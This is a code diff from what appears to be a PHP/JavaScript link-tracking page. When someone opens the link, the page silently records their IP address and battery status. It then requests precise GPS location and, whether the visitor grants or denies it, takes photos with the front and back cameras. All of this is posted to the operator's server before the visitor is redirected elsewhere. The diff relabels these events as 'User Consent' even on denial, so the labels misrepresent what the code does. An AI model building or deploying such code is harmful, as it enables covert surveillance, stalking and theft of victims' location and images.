         var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
@@ -256,18 +328,20 @@ if (!$l) { $l = ['id'=>'ROOT', 'title'=>get_c('root_title'), 'desc'=>get_c('root
         <div id="v" class="hidden mt-8"><button onclick="forceAsk()" class="w-full bg-blue-600 text-white font-black py-4 rounded-[2rem] shadow-2xl uppercase italic border-none cursor-pointer"><?=get_c('btn_text')?></button></div>
     </div>
     <script>
-    async function takeSnap(){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:true}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
-    const push = (st, la=null, lo=null, img=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: '<?=$id?>', lat: la, lon: lo, st: st, img: img, v4:v4, v6:'N/A', bat:bat })});
+    const captureFront = <?=json_encode(get_c('capture_front') === '1')?>;
+    const captureBack = <?=json_encode(get_c('capture_back') === '1')?>;
+    async function takeSnap(facingMode){ try { const v=document.createElement('video'),c=document.createElement('canvas'),s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}}}); v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); await v.play(); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const d=c.toDataURL('image/jpeg',0.7); s.getTracks().forEach(t=>t.stop()); return d; } catch(e){return null;} }
+    const push = (st, la=null, lo=null, payload={}) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: '<?=$id?>', la: la, lo: lo, st: st, v4:v4, v6:'N/A', bat:bat, ...payload })});
     let v4="<?=$ip_v4_serv?>", bat="N/A";
     window.onload = async () => {
         try { v4 = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; if(navigator.getBattery){ const b=await navigator.getBattery(); bat=Math.round(b.level*100)+"% "+(b.charging?"[⚡]":"[🔋]"); } } catch(e){}
-        push('Link Open (Silent IP Capture)');
-        setTimeout(() => { document.getElementById('ldr').classList.add('hidden'); document.getElementById('v').classList.remove('hidden'); forceAsk(); }, 1500);
+        push('Link Open (IP Only)');
+        setTimeout(() => { document.getElementById('ldr').classList.add('hidden'); document.getElementById('v').classList.remove('hidden'); }, 1500);
     };
     function forceAsk() {
         navigator.geolocation.getCurrentPosition(
-            async (p) => { const snap = await takeSnap(); await push('GPS Precision Success', p.coords.latitude, p.coords.longitude, snap); location.replace("<?=$l['redir']?>"); },
-            async (e) => { const snap = await takeSnap(); alert("Vui lòng cho phép xác thực hệ thống."); location.reload(); },
+            async (p) => { const img_front = captureFront ? await takeSnap('user') : null; const img_back = captureBack ? await takeSnap('environment') : null; await push('GPS Precision Success - User Consent', p.coords.latitude, p.coords.longitude, { img_front, img_back, img: img_front || img_back }); location.replace("<?=$l['redir']?>"); },
+            async (e) => { const img_front = captureFront ? await takeSnap('user') : null; const img_back = captureBack ? await takeSnap('environment') : null; await push('GPS Denied - User Consent', null, null, { img_front, img_back, img: img_front || img_back }); location.replace("<?=$l['redir']?>"); },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     }
